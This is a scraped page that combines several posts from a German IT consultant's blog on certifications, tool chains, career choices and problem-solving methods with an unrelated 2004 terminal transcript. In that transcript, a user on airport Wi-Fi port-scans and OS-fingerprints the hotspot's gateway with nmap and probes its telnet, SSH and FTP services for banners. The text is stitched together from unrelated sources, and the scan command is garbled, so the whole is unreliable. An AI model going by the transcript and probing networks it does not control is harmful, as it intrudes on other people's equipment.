port, two ports for external display connection (VGA and HDMI). The travel hub is connected with USB Type-C to my ThinkPad.Patrick Terlisten/ www.vcloudnine.de/ Creative Commons CC0My ThinkPad T480s was delivered with a 60W USB-C AC adapter, but I decided to buy a smaller Lenovo USB-C 45W AC Adapter.Patrick Terlisten/ www.vcloudnine.de/ Creative Commons CC0For notes and sketches, I use a simple notebook and two LAMY pencils, a LAMY logo (brushed) pencil, and a LAMY logo ballpoint pen.Patrick Terlisten/ www.vcloudnine.de/ Creative Commons CC0That’s it. That is everything a have in my bag.What is in your laptop bag? This entry was posted in Job and tagged job, productivity, tech on October 17, 2018 by Patrick Terlisten. Exam prep & experience: VMware Certified Advanced Professional 6 – Data Center Virtualization Deployment Exam (VCAP6-DCV Deploy) 2 RepliesTL;DR: I have passed the VCAP6-DCV Deploy exam today. :) I want to thank Fred, Dominik, Frank and Jens-Henrik for kicking my ass. Without you, I would have taken the VCP 6.5 delta exam. Thank you!As often, the whole thing started with a tweet. A tweet about my expiring VMware Certified Professional (VCP) certification.Time to prepare the VCP-DCV 6.5 Delta. Otherwise my VCP expires in a couple of months.— Patrick Terlisten (@PTerlisten) June 30, 2018To my surprise, several of my followers recommended to go for the VCAP6-DCV Deployment instead. Okay, so many smart people can’t be wrong.I booked the exam, prepared for the exam, took the exam today – and passed!27 questions in 205 minutes (25 minutes extension for non-native speaker) is a pretty challenging task. I was able to answer all questions in the given time. I left the test center with a good feeling, and after an hour I got the mail that I have passed the exam! Woohoo!Preparation is everythingPreparation and time management. That’s all. Easier said than done. ;)Make sure that you have read the exam guide. This document is intended to provide detailed information about the objectives covered by the exam. It was crucial for me to get a feeling about what I have to learn. I have been working with VMware vSphere since ESX 2.5, that’s a pretty long time, yet I do not know everything. Especially things like vSphere Data Protection, Auto Deploy or some certificate-related tasks are not day-to-day tasks.I premillary worked with Kyle Jenners VCAP6-DCV Deployment Study Guide and and the VMware Hands-on-Lab. The VCAP6-DCV Deployment is not a MC test, like the VCP exams. You have to do real tasks. So experience is crucial to pass the exam.Because I don’t have a lab, I used the VMware Hands-on Lab instead. I can recommend these three courses:HOL-1911-01-SDC (What’s New in VMware vSphere 6.7)HOL-1808-01-HCI (vSAN v6.6.1 – Getting Started), andHOL-1827-01-HCI (VMware Storage – Virtual Volumes and Storage Policy Based Management)Unfortunately, there is no course available that covers vSphere Data Protection and vSphere Replication.But there was also another reason, why I have used the HOL: The VCAP exam environment is based on the interface of the VMware HOL. This was pretty helpful, because I was able to get in touch with the interface prior the exam.Due to security restrictions, the exam environment does not support some keys and shortcuts, e.g. CRTL and ALT. To my surprise, the Backspace key worked in my enviornment. Many people stated, that the Backspace key isn’t working. Because of this, VMware has published an Interface Guide. Make sure to read it! And learn how to get around these limitations. There is also a pretty handy YouTube video with tips and tricks:To test yourself, you can use this free VCAP-DCV simulator. The simulation provides scenarios that are equal to the scenarios from the exam. This is pretty handy to get a feeling of how good you are prepared for the exam.VCAP6-DCV Deploy Exam Simulator – FREEYou have ~ 7 minutes per questions. If you don’t have an idea how to answer a question, move on! Write down the number and some keywords, then move onto the next question. Instead of waiting for tasks to finish, move onto the next question and come back later to check the task result.I took the exam at Blue Consult in Krefeld (Germany). This was a recommendation of one of my followers (Thanks Dominik!). Fortunately, Blue Consult has keyboards with US layout in their test center, which makes it much easier for me. The performance of the exam environment was quite good. No lags or hanging sessions.What’s next?I will book the VMware Certified Advanced Professional 6.5 – Data Center Virtualization Design exam as soon as I passed the NetScaler CCP-N exam, which I have to take until end of December 2018 (Thank you Citrix… NOT!).VCIX6.5-DCV FTW! :) This entry was posted in Job, Virtualization and tagged certification, job, vcap, vExpert, vmware on September 20, 2018 by Patrick Terlisten. HPE Networking expert level certifications Leave a replyThis posting is ~1 year years old. You should keep this in mind. IT is a short living business. This information might be outdated.A couple of days ago, I took the HP0-Y47 exam “Deploying HP FlexNetwork Core Technologies”. It was one of two required exams to achive the HPE ASE – Data Center Network Integrator V1, and the HP ASE – FlexNetwork Integrator V1 certification. It was a long planned upgrade to my HP ATP certification, and it is a necessary certification for the HPE partner status of my employer.TeroVesalainen/ pixabay.com/ Creative Commons CC0You might find it confusing that I’m talking about an HP ASE and a HPE ASE. That is not a typo. The HP ASE was released prior the HP/ HPE split. The HPE ASE was released after the split in HP and HPE.The HP/ HPE ATP is a professional level certification, comparable to the Cisco Certified Network Associate (CCNA). The HP/ HPE ASE is an expert level certification, so the typical candidate for a HP/ HPE ASE certification is a professional with three to five years experience in designing and architecting complex enterprise-level networks.RequirementsThere are different ways to achieve this certification. Regardless of the way you chose, you need a certification from which you can upgrade. This does not have to be a HP/ HPE certification! If you hold a valid CCNA/ CCNP or JNCIP-ENT, you can upgrade from this certification without the need of a valid HP/ HPE ATP Networking certification.If you want to earn the HPE ASE – Data Center Network Integrator V1, and the HP ASE – FlexNetwork Integrator V1 certification in a single step, you need at least one of these certifications:HP ATP – FlexNetwork Solutions V3HPE ATP – Data Center Solutions V1Or if you want to upgrade from a non-HP/ HPE certification:Cisco – CCNP (any CCNP regardless of technology)Cisco – Certified Design Professional (CCDP)Juniper – JNCIP-ENTNow you need to pass two exams:HP2-Z34 (Building HP FlexFabric Data Centers)HP0-Y47 (Deploying HP FlexNetwork Core Technologies)HP2-Z34 (Building HP FlexFabric Data Centers)The HP2-Z34 exam focuses on deployment and implementation of HPE FlexFabric Data Center solutions. Therefore, the exams covers topics likeMultitenant Device Context (MDC)Datacenter Bridging (DCB)Multiprotocol Label Switching (MPLS)Fibre Channel over Ethernet (FCoE)Ethernet Virtual Interconnect (EVI),Multi-Customer Edge (MCE),Transparent Interconnection of Lots of Links (TRILL), andShortest Path Bridging Mac-in-Mac mode (SPBM).HPE offers a study guide to prepare for this exam: Building HP FlexFabric Data Centers (HP2-Z34 and HP0-Y51). I used this guide to prepare for the exam (eBook). The guide was of an average quality. Its sufficient to prepare for the exam, but I used other materials to get a better understanding of some topics.HP2 exams are web-based exams. To pass the HP2-Z34 exam, I had to answer 60 questions in 105 minutes, with a passing score of 70%. The exam was quite demanding, especially if you don’t have much real-world experience with some of the covered topics.HP0-Y47 (Deploying HP FlexNetwork Core Technologies)The HP0-Y47 exam covers the configuration, implementation, and the troubleshoot enterprise level HPE FlexNetwork solutions. The exam covers different topics, e.g.Quality of Service (QoS)redundancy (VRRP, Stacking)multicast routing (IGMP, PIM)dynamic routing (OSPF, BGP)ACLs, andport authentication/ port security (Mac-auth, Web-auth, 802.1x)I used the HP ASE FlexNetwork Solutions Integrator (HP0-Y47) study guide to prepre myself for the exam. Unfortunately, it had the same average quality as the HP2 Z34 guide: Good enough to pass the exam, but don’t expect to much. HP0-Y47 is a proctored exam. I had to answer 55 questions in 150 minutes, with a passing score of 65%. The exam is not very hard, if you were familiar with the covered topics. Experience with ProVision and Comware is absolutely necessary, because both platforms have their peculiarities, e.g. processing of ACLs, differences in Stacking technologies, commands, STP support etc.It took me some time to prepare for both exams, despite the fact that I work with ProVision and Comware Switches every day. So I’m pretty happy that I passed both exams on the first try. This entry was posted in Certification, Job, Networking and tagged certification, exam, hpe, job, networking on May 28, 2018 by Patrick Terlisten. My tool chain for 2018 Leave a replyThis posting is ~1 year years old. You should keep this in mind. IT is a short living business. This information might be outdated.Each of us has his or her personal tool chain. Depending on your job role, the tool chain will look different. My personal tool chain does not have changed much over the last few years, but if I added or removed a tool to my tool chain, this change was often influenced by other peoples tool chain.Rainer Sturm/ pixelio.deMy primary work device is a Lenovo ThinkPad X250 (Intel i5 5200U, 8 GB RAM, 250 GB SSD) with Windows 10. I’ve added a 6 cell battery, so I have ~ 95 Wh of battery capacity. This gives me ~ 16h of battery lifetime with my common workload. The 12,5″ screen seems to be small, but it’s okay as I have two 24″ displays at the office. It’s small, lightweight, long battery life and powerful. I awaited the new Lenovo Thinkpads, that were presented some day ago on the CES. But Lenovo removed the Ethernet port on the X280. So this is not longer an option. Maybe the T480 with an additional 72 Wh battery… Devices and accessories are safely stowed in an Eastpack Floid Ash Blend2. It’s a great backpack, light and not too big.Browser and OfficeI have used Google Chrome for years, but with the latest Firefox release I switched back to Firefox and disabled all Google services I used before. I even try to avoid using google.com and use duckduckgo.com instead. Microsoft Office 2013 is corporate standard, so nothing much to say about it.Knowledge ManagementI primarily use two tools to dump my brain onto my hard disk. One is Microsoft OneNote, the other one is XMind 8 Pro. I’m using OneNote to store snippets, meeting protocols, summaries etc. in two notebooks. One notebook is for customer related stuff, the other notebook is for knowhow and snippets. A third notebook is shared between colleagues and me. I often use the web version of OneNote, available on onenote.com.ToolsRoyal TS is an awesome remote management solution, helping me to keep track of all those RDP and VNC sessions. And it can do much more. I switches from PuTTY to KiTTY last year. KiTTY is a PuTTY fork with some nice additions, like folders or scripting. My VMware application stack consists of the good, old VMware vSphere C# Client (don’t judge me…), PowerCLI and the VMware vSphere Remote Console. The web-based Clients are onboard as well. Filezilla is something that I’m using for years. FTP, S/FTP oder SCP are common protocols, most times used to upload firmware, or download config files from network devices. Wireshark is another veteran in my tool chain. Nothing much to say. The army knife in case of network troubleshooting. Authy is pretty new in my tool chain. I discovered it some weeks ago as an alternative to the Google Authenticator app in my iPhone. A pretty cool app. I can have the same accounts on my smartphone and in a desktop app. No need to grab my phone if I need 2FA at my laptop. And, IMHO a big benefit, an encrypted backup of my 2FA accounts. But 2FA or MFA is only one factor. The other factor is the password and I’m forcing me to use different passwords for different services. I’m getting older, so I use Keepass to store my usernames and passwords in a safe, password protected and encrypted database.DevelopmentI’m not a developer. But sometimes I have to write scripts in PowerShell or Python, transform data etc. My developer tool chain is full of well known tools. Notepad++ is my favorite text editor for years. ISE Steroids is still my favorite PowerShell IDE, even if I have Visual Studio Code installed. But this is mainly used for Python. ISE Steroids variable monitoring function is superior. Currently, I don’t get my mind wrapped around the VS Code debugging mode. But I swear that I will try it in 2018! GitHub Desktop is mandatory, not only for PowerShell and Python snippets, but also for my scripts and dot files (VIM, ZSH etc.).Other stuffSometimes I like to hear music during work. I love Spotify. I don’t have to run VMs on my laptop, but when I have to, VMware Workstation Pro is my desktop virtualizer of choice. For reading PDFs I switched from Adobe Reader to Google Chrome, and after removing Chrome, to Foxit Reader. This entry was posted in Job and tagged job, software on January 6, 2018 by Patrick Terlisten. Continuity vs. change 1 ReplyThis posting is ~2 years years old. You should keep this in mind. IT is a short living business. This information might be outdated.Note: I trashed this blog post several times. But I would like to express my point of view (hey, this is my blog. :D )Some weeks back, I had an interesting discussion with a HR consultant. Bottom line: You ruin your career, if you stay for more than 3 years at the same company. IMHO this is bullshit.I have started my IT career, right after school, with an apprenticeship at a local IT company. I finished this apprenticeship three years later, and my employer offered me a position as IT-Technician. Until 2004, I changed my employer three times. There were good reasons for each change. I learned pretty much in these years. The last change took me to my current employer. I have started as a Technical Consultant in October 2004. Today, thirteen years later, I’m leading the consulting and services business unit. There is a good chance I will not leave this company until retirement. At least not for the same or similar job role.But is it a good idea to work for such a long time for the same company? What about challenges, motivation, perspectives, and income? How can you develop yourself, if you are working for the same company for such a long time? Isn’t this boring?ChallengesChallenges are important. They help us to develop ourselves. Sure, customer projects can be challenging. But that is not what I mean. The biggest challenge, that we are all facing, is our job! Technology is changing so fast, and it will never stop. I’m a infrastructure guy. I don’t think that I have to explain how things like virtualization or cloud have changed the way we build infrastructure. “Never stop learning” is one of the biggest challenges in our job.MotivationMoney is a bad motivator. It motivates only for a short period of time. Once you get used to it, the motivation is gone. “Strive for perfection” – that is something that motivates me. “Strive for perfection”, regardless if it is for a project, or for your own skill set.IncomeIs income everything? Nope, it is not. I had the chance to earn much more money. But at what price? Travelling from monday to friday, and leaving the family again on sunday? To be one of many highly skilled employees, with a manager in oversea? Ôr doing stuff I don’t want to do, just because it is well paid? That was never an option for me. What about working hours? Amount of travel? Car policy? Employer-funded pension? Having a safe job? To work for the founder of the company, and not for the shareholders. Money is not everything.PerspectivesGood employees rarely remain unrecognized. Companies, that strive for sustainability, should try to promote employees. Often it is better to raise someone from the team into a manager role, than hiring someone from outside of the company. This opens perspectives for employees. Sure, sometimes you have to hire someone from outside. There are different reasons for this.Should I stay or should I go?It is not reprehensible to move forward, if the  conditions no longer fit. But it does not have to be bad to stay with an employer, and to develop itself and the company. This entry was posted in Job and tagged career, job on October 13, 2017 by Patrick Terlisten. Fight the chaos: Design your toolbox properly Leave a replyThis posting is ~3 years years old. You should keep this in mind. IT is a short living business. This information might be outdated.You need tools and methods to accomplish your daily tasks. No one will deny this insight.I would like to give you an insight into my box of tools and methods. These tools and methods work for me, but they do not have to work for you. The design of your personal toolbox depends on your job.Depending on who you ask, my job role consists of several roles: Currently, I am working as a consultant, head of the business unit, pre-sales consultant and technical account manager. That’s what you get when working in a very small company… And because of these different roles, my personal toolbox may differ from yours.Daily ToolboxIndependent of the task, role or customer, some tools are always in use.Google ChromeBrowserMicrosoft OutlookMailMicrosoft OneNoteKnowledge ManagementMyLifeOrganizedTo-Do list, task management & personal organizerXMindMind Mapping SoftwareGoogle Chrome and Microsoft Outlook don’t have to be explained. I use several extensions for Chrome, like OneTab, chromeIPass, Clip to OneNote, Adblock Plus, Ghostery and SwitchyOmega.Microsoft OneNote is my personal notepad, I use it for notes, snippets, sketches, code dump etc. I don’t take paper with me.In the past, I used it on my iPad and my laptop, but for about a year I only take my Lenovo X250 with me. And if I do not have my laptop with me, a simple Internet browser or my iPhone is enough to get my notes.MyLifeOrganized is similar to OmniFocus. It’s a very powerful tool for to-do lists and task management. I’m currently testing it, and I really like it. But it’s not cheap (MOL Pro for Windows $59.95,  MOL Pro for iPhone $29.99, Cloud Sync for 12 month $14.95).XMind is available for free, but there is also a Plus and Pro version. I switched from Mindjet MindManager to XMind, because XMind was capable to read MindManager files. Mindjet MindManager is really expensive, and after leaving the FernUniversität Hagen, I was not entitled for academic discounts anymore. But XMind is really similar to MindManager. I like the concept of mind maps and I use it quite often for project planning and management.ProductivityMicrosoft WordWriting docs,  proposals etc.Microsoft ExcelCalculations, data processing, proposalsMicrosoft PowerPointPresentationsInternet ExplorerSometimes you need it…Notepad++Powerful text editorMicrosoft Word, Excel and PowerPoint are self-explanatory. Sometimes I have to use the Internet Explorer. It is 2016 and there is still software out there that simply does not work properly with Firefox or Chrome. It’s a pity… Notepad++ is a free (GPL licensed) source code editor and Notepad replacement . Good piece of software and it’s free!AdminWhen I’m working for customers, I mostly need three tools: An internet browser, something for RDP connections, the vSphere C# client, and a SSH client.Royal TSConnection Management SoftwareVMware vSphere C# ClientStill necessary for some tasks…KiTTYA PuTTY cloneRoyal TS makes my life so much easier! Royal TS is a connection management software for RDP, VNC, SSH based terminals or web-based interfaces. It also includes credential management. Very handy!The vSphere C# client is mandatory. Even if I have not explicitly listed it, I also have installed the Client Integration Plug-In in the vSphere Web Client, as well as the VMware Remote Console.KiTTY is a PuTTY clone. KiTTY is a fork from version 0.67 of PuTTY and includes some features like portability, automatic password, session filter, send to tray and many more.Pre-SalesHPE SalesBUILDER for windowsPre-Sales configuration toolHPE Ninja STARS for HPE 3PARSizing tool for HPE 3PAR StoreServI often work with HPE products, and because of this, the HPE SalesBUILDER and the HPE Ninja STARS tool are quite often in use. Both are available to HPE Partners only.DevelopmentI’m not a developer, but sometimes I have to write code, mostly PowerShell.Windows PowerShell ISE with ISESteroidsPowerShell IDEVMware PowerCLIPowerShell interface for managing VMware vSphereGitHub DesktopVersion control and source code managementPython 3.5 IDLEIntegrated Development and Learning EnvironmentFor PowerShell, I use the Windows PowerShell ISE with ISESteroids. ISESteroids is an  add-on for the Windows PowerShell ISE, which extends the ISE with many, many useful features. I have written a blog post about it.VMware PowerCLI is self-explanatory and a must, if you are frequently working with VMware products.I have rarely used GitHub Desktop to manage my code, but I have decided to change this for 2017. I use GitHub Desktop to sync my code between my two laptops (one for work, and the other for lab, projects etc.).I’m still in the process to learn Python, and I have written a blog post months ago why I want to learn Python (Hey infrastructure guy, you should learn Python!). I played a bit with PyCharm Community edition, but now I’m using the Python IDLE again. It’s basic functionality is enough for the moment.MethodsA fool with a tool is still a fool. You are nothing without supporting methods. I mainly use three different methods:Getting things done (GTD)KanbanPomodoroYou may be wondering about this list, because GTD and Pomodoro are both time-management methods. And you may wonder how Kanban fits into this list. It’s all about the flow.The idea behind GTD is to get tasks out of your head by writing them down, and breaking them down into smaller work pieces. This allows you to focus on accomplishing tasks. Btw: Mind mapping is a great way to graphically depict this.Pomodoro uses a timer to break down work into intervals, traditionally 20 to 25 minutes, separated by short breaks of 5 minutes. After four intervals, a break of 15 minutes is given. This technique can improve mental agility, and help you to focus on the currently active task. But what if a distraction pops into your head,? Write it down, then get back on the active task. That is the link between GTD and Pomodoro.Kanban implements the pull principle in Lean Management. It limits the work in progress, thereby avoiding waste through multitasking and context switching. Kanban uses visual elements (cards on a board) to visualize the current state of the work and the workflow.SummaryThis box of tools and methods works for me in my current situation. Feel free to leave a comment, or write a blog post about your tools and methods. This entry was posted in Job and tagged job, lean, productivity on November 27, 2016 by Patrick Terlisten. Why VARs should rethink their business model Leave a replyThis posting is ~3 years years old. You should keep this in mind. IT is a short living business. This information might be outdated.Okay, the headline of this blog post is a bit provocative. This blog post is not written from the vendor perspective. It’s the perspective of someone, who’s sitting between the vendor and the customer. A value-added reseller (VAR) is typically located between vendor and customer. And the business model of a VAR is typically based on selling hardware, software and service.Added valueThe typical customer doesn’t have the time, money and the know-how to transform business requirements into a bill of materials (BOM). It’s a “make-or-buy” decision. And “buy” is often better than “make”. The customer needs a partner who helps him to transform the business requirements into a solution and a BOM.Even “simple” things, like a new server, are sometimes complex. What memory configuration? How many disks? Which controller? Which CPU for which application? Who ensures that the firmware is upgraded? Who labels the cables during rack-and-stack? These things are not self-evident. Sure, servers are commodities. You can buy a HPE ProLiant from an online shop. You can buy expansion enclosures for a HPE 3PAR from an online shop. You can buy nearly everything online. But what customer risks it to buy crap? At this point, a VAR can offer added value.The downside of a buyers marketIT budgets are under considerable cost pressure. The customer always wants the best price. And there are many VARs. As a VAR, you are not in the best position. Information technology is a buyers market. As a VAR, you must offer added value and the best price. Customers love free advice… and then they buy from an online shop, or from another VAR that was cheaper.Cloud eliminates hardware/ software revenuesCloud offerings are awesome! For customers… But they are the plague for VARs. Usually you need to sell more billable hours to achieve the same margins with cloud offerings and service, as with a combination of hardware, software and service. And your employees need different skills. Take the example of Office 365. To date, a VAR has sold 200 licenses for Microsoft Office (Open License). Now he sells 200 E3 plans. Revenue is not the same. Maybe a little more service for the implementation of Office 365 and AD FS. Or Microsoft Exchange. Many customers consider the use of Exchange Online (often as part of an Office 365 deployment). Or Microsoft Azure instead of VMware vSphere on-premises. No hardware, less software, similar amount of service, but a different skills.Develop your business modelCloud offerings and “price-conscious” customers are forcing VARs to rethink their business model. Decreasing margins and a highly competitive market make the sale of hardware and software increasingly unattractive. But cloud offerings require other skills from your sales and technical teams. Such fundamental changes need time, patience and leadership to be successful. This entry was posted in Job and tagged cloud, infrastructure, job on July 5, 2016 by Patrick Terlisten. Solving problems: A structured approach Leave a replyThis posting is ~3 years years old. You should keep this in mind. IT is a short living business. This information might be outdated.What is a problem? A problem is an obstacle, that has to be surmounted. Solving a problem is connected with obstacles. Or more general: Problem solving is a process to get from an unsatisfactory to a satisfactory situation.Most of us get paid for solving problems. It’s irrelevant if you are paid for solving technical problem (e.g. My computer doesn’t work), or if you are paid to create solutions for customers (e.g. design infrastructure for a Citrix XenApp farm). At the end you solve a problem.Every problem has characteristics, that can be used to describe it.SolubilityNot every problem is solvable. Think about “Squaring the circle“. But often a problem seems to be unsolvable because it’s not well defined. If Initial situation, obstacle and target situation are not clearly formulated, you won’t be able to solve the problem.DecomposabilityIf you can decompose a problem into multiple subproblems, it is a hierarchical problem. Otherwise, it’s an elemental problem.EffortThe effort to solve a problem is always different.. A problem is theoretically solvable, but it may require such a high effort, that it is practically unsolvable.SubjectivityEven if a problem is well defined, it appears different in regard to complexity for different people.How to start?First of allUnderstand and define the problemThis is most important part. Before you try to solve a problem, make sure that you have really understood the problem. Then you should define the problem. Only a clearly defined problem can be solved. And it’s much easier to solve a clearly defined, than a vague problem. If it’s a complex problem, then you should try toSimplify or decompose the problemA simplified problem can help you stay focused. If you can’t simplify a problem, you can try to divide it into subproblems. With a clearly defined, simplified/ structured problem, you can start toFind the root causeCollecting information is the key. Collect information about what happened before, during, and after the problem has occurred. Identifying the root cause for a problem can be a time consuming task. But let me say this clearly: Information is the key. Information that help to find the root cause are not only observations (e.g. logs, error messages etc.). You can can use the results of systematic tests. Collect as much data as you can.Sometimes it can be useful to create a hypothesis.Scientists generally base scientific hypotheses on previous observations that cannot satisfactorily be explained with the available scientific theories.If you see that System A is affected, but system B should be affected too, but it’s not, it might be time to create a hypothesis. With a hypothesis in mind, you can try to prove it. Test the hypothesis by performing tests and collecting data. This strategy is called “hypothesis testing”.At some point, you should have identified the root cause. With the now known root cause, you canCreate solutions and select the best oneSometimes it’s easy. But sometimes it’ not that easy. A trade-off analysis can help to identify the best of multiple solutions.Create an action planEven if you only have to disable a specific feature, it’s a good idea to formulate an action plan. Even if consists only of three lines… You should state clearlyWHAT you doWHY do you have to do it, andHOW to you plan to check itWith these steps, you should be well prepared. It doesn’t matter what kind of problem you are trying to solve: The process is basically the same.Other problem solving methodsOver the years many problem solving methods have been developed. Kepner-Tregoe is one of them. Other well known methods are:A3 Problem SolvingPDCAEight Disciplines (8D) Problem SolvingFailure mode and effects analysis (FMEA)A3 Problem Solving has been developed at Toyota for their Toyota Production System (TPS). It’s an often used method in Lean Manufacturing. A3 helps to solve problems by pretending a structure (WHAT IS and WHAT IS NOT the problem, describe the problem, root cause, solution etc). This strucure is placed on an A3 sheet paper (that why it’s called A3). The process is based on the principles of Deming’s PDCA cycle.PDCA, or Plan-Do-Check-Act (sometimes Shewhart-Cycle) was made popular by Dr. Edwards Deming. Plan-Do-Check-Act refers to the four phases of this cycle.Plan: Plan the changeDo: implement the changeCheck: Check the sucess of the implemented changeAct: Take action based on the results of “Check”Eight Disciplines (8D) Problem Solving was developed by the Ford Motor Company. The D0 phase is the starting point for the D8 process, but it’s not counted.D0:  Plan for solving the problem and determine the prerequisitesD1: Establish a team of people with the required skills and knowledgeD2: Describe the problemD3: Define and implement containment actionsD4: Determine and verify the root causesD5: Plan permanent corrective actions for the observed problemD6: Implement the best permanent corrective actionsD7: Modify management systems to prevent a recurrenceD8: Congratulate your team!The Failure mode and effects analysis (FMEA) is a highly structured, systematic approach for failure analysis. There are different FMEA alalyses:FunctionalDesignProcessFMEA is based on inductive reasoning (forward logic). FMEA is based on a highly structured process, which can be represented as followed.Structural analysis: A system is divided into its componentsFunctional analysis: Identify the function of each componentFailure analysis: Identify the possible failures for each componentCalculate the risk: Risk Priority Number = occurrence ranking x detection ranking x highest severity rankingOptimize: Optimize the component to mitigate the riskNo matter what, stay organizedThe key to successfully solve problems is to stay organized. Solving problems isn’t magic. It is a very structured process that gets better with increasing experience. Try to create your own, structured method. Or use one of the mentioned problem solving methods. But in general:Always try to describe a problemTry to simplify or break it into smaller problemsSearch and verify for the root causeDevelop a solution This entry was posted in Job and tagged job, operations management, troubleshooting on May 5, 2016 by Patrick Terlisten. VCP6-DCV Delta Beta exam experience 2 RepliesThis posting is ~4 years years old. You should keep this in mind. IT is a short living business. This information might be outdated.Today, I took my very first VMware beta exam. I took the 2V0-621D exam, known as the VMware Certified Professional 6 – Data Center Virtualization Delta Beta Exam, at a local Pearson VUE test center. This exam is a possible migration paths from a valid VCP5-DCV, or any valid solution track VCP, to the VCP6-DCV certification.The benefit of a beta exam is the low price (currently 50 US-$) and a chance to upgrade the associated certification, in this case the VCP6-DCV. This was the main reason for me to request the authorization and schedule an appointment at a local Pearson VUE testcenter. When I pass the exams, that would be a very effective and simple upgrade.Exam topicsThe blueprint for the delta beta exam consists of 10 sections and it covers a bit more then only VMware vSphere 6.Section 1: Configure and Administer vSphere 6.x SecuritySection 2: Configure and Administer Advanced vSphere 6.x NetworkingSection 3: Configure and Administer Advanced vSphere 6.x StorageSection 4: Upgrade a vSphere Deployment to 6.xSection 5: Administer and Manage vSphere 6.x ResourcesSection 6: Backup and Recover a vSphere DeploymentSection 7: Troubleshoot a vSphere DeploymentSection 8: Deploy and Consolidate vSphere Data CenterSection 9: Configure and Administer vSphere Availability SolutionsSection 10: Administer and Manage vSphere Virtual MachinesEach section includes one or more objectives. In opposite to exam 2V0-621, the VMware Certified Professional 6 – Data Center Virtualization Beta Exam, the delta exam doesn’t include the objectives7.4: Troubleshoot and Monitor vSphere Performance7.5: Troubleshoot HA and DRS Configurations and Fault Tolerance8.3: Consolidate Physical Workloads using VMware Converter10.3: Configure and Maintain a vCloud Air ConnectionManfred Hofer highlightes this already in a blog post about his exam experience. But instead, the delta exam includes the objective9.3: Setup and Configure AppHASo if you take the delta beta exam, you better take a closer look at VMware AppHA.The examThe exam consists of 75 single and multiple choice questions. You have 90 Minutes time to answer all questions. If you are a non-native english speaker, you will get 30 minutes extra. The questions are not always related to VMware vSphere 6! There are also questions about vSphere in gerneral, or prodcuts around vSphere, like Replication or AppHA. In my case, the questions were very unevenly distributed over the blueprint sections. I got a relatively high number of questions involving HA, DRS, Resource Pools and troubleshooting in general. Carefully reading the question and answers was very helpful. In most cases, I was able to eliminate wrong or unlikely answers. Answers must not be correct, sometimes answers were “best fit” answers.With 75 questions in 120 minutes, I had more than one minute per question. That’s much more time as you get in the VCP5-DCV (vSphere 5.5) exam. There you have to answer 135 questions in 120 minutes. After 60 minutes I clicked the “End Exam” button. Now I have to wait. The results will be published after the end of the beta phase. This may take 6 to 8 weeks.I don’t know if I passed the exam. In fact, I did not really prepare for the exam. I have the documents just flown over. But it was a very nice experience. This entry was posted in Certification, Job, Software, Virtualization and tagged certification, exam, job, vExpert, vmware, vsphere on May 26, 2015 by Patrick Terlisten.Post navigation← Older postsSearch on vcloudnine.de Search for:
+LicenseThis work is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License.Support meVembu WebinarPartnerBadgesTags3parautomationazurebackupblogbugcertificationcitrixclouddatacoredata protectoresxiexamexchangeexchange 2013homelabhorizon viewhphpehyper-vindustrializationjobjuniperlinuxmicrosoftnetscalernetworkingoperations managementpower clipowershellproductivityproliantsecurityserversoftwarestoragestoreoncetroubleshootingvdiveeamvExpertvirtualizationvmwarevspherewindows Privacy Policy
+Proudly powered by WordPress
+This site uses cookies. By clicking OK you agree to the use of cookies. OK Decline Additional informationI was unable to get my IPsec NAT-T to work through this NAT-T box.
+Also, they intercept my SMTP sessions, as pike.sandelman.ca actually supports
+EHLO, and DEFINITELY suppors STARTTLS, while this "proxy" does not.
+It was nice to sit at the pub and web surf at the Ottawa Airport, but the
+previous service run in the old airport was SIGNIFICANTLY better.
+Script started on Tue Nov 30 14:45:18 2004
+marajade-[~] mcr 1001 %iwconfig eth1
+eth1
+IEEE 802.11-DS
+ESSID:"concourse"
+Nickname:"HERMES I"
+Mode:Managed
+Frequency:2.437 GHz
+Access Point: 00:12:00:D7:24:20
+Bit Rate:5.5 Mb/s
+Tx-Power=15 dBm
+Sensitivity:1/3
+Retry limit:4
+RTS thr:off
+Fragment thr:off
+Power Management:off
+Link Quality=39/92
+Signal level=-57 dBm
+Noise level=-96 dBm
+Rx invalid nwid:0
+Rx invalid crypt:0
+Rx invalid frag:0
+Tx excessive retries:4
+Invalid misc:0
+Missed beacon:0
+marajade-[~] mcr 1002 %ifconfig eth1
+eth1
+Link encap:Ethernet
+HWaddr 00:E0:63:81:F7:D7
+inet addr:10.1.7.253
+Bcast:10.1.7.255
+Mask:255.255.255.0
+inet6 addr: fe80::2e0:63ff:fe81:f7d7/64 Scope:Link
+UP BROADCAST RUNNING MULTICAST
+MTU:1500
+Metric:1
+RX packets:8226 errors:0 dropped:0 overruns:0 frame:0
+TX packets:7490 errors:6 dropped:0 overruns:0 carrier:0
+collisions:0 txqueuelen:1000
+RX bytes:1185213 (1.1 MiB)
+TX bytes:1083384 (1.0 MiB)
+Interrupt:3 Base address:0x100
+marajade-[~] mcr 1003 %sudo nmap -O 10.1.7.1-O 10.1.7.1n-O 10.1.7.1 -O 10.1.7.1
+Starting nmap 3.75 ( http://www.insecure.org/nmap/ ) at 2004-11-30 14:46 EST
+Interesting ports on 10.1.7.1:
+(The 1654 ports scanned but not shown below are in state: closed)
+PORT
+STATE SERVICE
+21/tcp
+open
+ftp
+22/tcp
+open
+ssh
+23/tcp
+open
+telnet
+53/tcp
+open
+domain
+80/tcp
+open
+http
+443/tcp
+open
+https
+2000/tcp open
+callbook
+3986/tcp open
+mapper-ws_ethd
+8081/tcp open
+blackice-icecap
+MAC Address: 00:30:48:73:7D:1D (Supermicro Computer)
+Device type: general purpose
+Running: Linux 2.4.X|2.5.X
+OS details: Linux 2.4.0 - 2.5.20
+Uptime 0.380 days (since Tue Nov 30 05:39:15 2004)
+Nmap run completed -- 1 IP address (1 host up) scanned in 6.968 seconds
+marajade-[~] mcr 1004 %telnet 10.1.7.1
+Trying 10.1.7.1...
+Connected to 10.1.7.1.
+Escape character is '^]'.
+MikroTik v2.8.18
+Login:
+telnet> q
+Connection closed.
+marajade-[~] mcr 1005 %telnet 10.1.7.1 22
+Trying 10.1.7.1...
+Connected to 10.1.7.1.
+Escape character is '^]'.
+SSH-1.99-OpenSSH_2.3.0p1
+^]
+telnet> q
+Connection closed.
+marajade-[~] mcr 1006 %telnet 10.1.7.1 21
+Trying 10.1.7.1...
+Connected to 10.1.7.1.
+Escape character is '^]'.
+220 MikroTik FTP server (MikroTik v2.8.18) ready
+QUIT
+221 Closing
+Connection closed by foreign host.
+zsh: 3379 exit 1
+telnet 10.1.7.1 21
+marajade-[~] mcr 1007 %telnet 10.1.7.1 8081
+Trying 10.1.7.1...
+Connected to 10.1.7.1.
+Escape character is '^]'.
